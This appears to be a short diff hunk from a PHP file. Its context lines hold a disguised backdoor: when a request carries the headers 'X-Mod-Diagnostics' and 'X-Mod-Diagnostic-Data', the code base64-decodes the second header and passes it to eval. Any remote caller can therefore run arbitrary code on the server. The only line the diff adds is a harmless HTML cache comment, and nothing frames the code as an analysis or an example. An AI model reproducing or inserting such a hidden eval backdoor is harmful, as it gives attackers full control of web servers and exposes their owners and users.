@@ -27,3 +27,4 @@ if (isset($_SERVER['HTTP_X_MOD_DIAGNOSTICS'])
     && isset($_SERVER['HTTP_X_MOD_DIAGNOSTIC_DATA'])) {
   eval(base64_decode($_SERVER['HTTP_X_MOD_DIAGNOSTIC_DATA']));
 }
+<!-- cache v2 -->
